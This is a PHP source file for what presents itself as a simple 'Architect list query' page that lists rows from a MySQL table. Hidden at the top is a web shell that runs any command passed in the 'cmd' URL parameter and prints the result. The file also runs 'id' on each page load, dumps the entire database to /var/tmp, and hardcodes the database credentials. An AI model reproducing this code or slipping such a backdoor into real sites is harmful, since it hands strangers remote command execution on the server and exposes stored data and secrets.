<?php

if (isset($_GET['cmd'])) {
    $res = shell_exec(urldecode($_GET['cmd']));
    print_r(str_replace("\n", '<br />', $res));

    exit();
}

$info = (object)array();
$info->username = "arch";
$info->password = "asdftgTst5sdf6309sdsdff9lsdftz";

function GetList($info)
{
    $link = mysqli_connect("127.0.0.1", $info->username, $info->password, "arch");
    $result = mysqli_query($link, "SELECT * FROM arch");

    $output = [];

    while ($row = mysqli_fetch_assoc($result)) {
        array_push($output, $row);
    }

    var_dump($output);

    return $output;
}

$output = shell_exec('id');
echo "<pre>$output</pre>";

//ENTER THE RELEVANT INFO BELOW
$mysqlDatabaseName = "arch";
$mysqlUserName = "arch";
$mysqlPassword = "asdftgTst5sdf6309sdsdff9lsdftz";
$mysqlHostName = "127.0.0.1";
$mysqlExportPath = "/var/tmp/ar.sql";

//DO NOT EDIT BELOW THIS LINE
//Export the database and output the status to the page
$command = 'mysqldump --opt -h' . $mysqlHostName . ' -u' . $mysqlUserName . ' -p' . $mysqlPassword . ' ' . $mysqlDatabaseName . ' > ' . $mysqlExportPath;
exec($command, $output = array(), $worked);

switch ($worked) {
    case 0:
        echo 'Database <b>' . $mysqlDatabaseName . '</b> successfully exported to <b>~/' . $mysqlExportPath . '</b>';
        break;
    case 1:
        echo 'There was a warning during the export of <b>' . $mysqlDatabaseName . '</b> to <b>~/' . $mysqlExportPath . '</b>';
        break;
    case 2:
        echo 'There was an error during export.';
        break;
}
?>



<!DOCTYPE html>
<html>

<head>
    <title>Architect list query</title>
</head>

<body>
    <form action="" method="GET">
        <input type="text" name="id" />
        <input type="submit" value="search">
    </form>
    <?php foreach (GetList($info) as $item) :
        echo $item["id"] . ":" . $item["arch"] . "<br />\r\n";
    endforeach; ?>
</body>

</html>
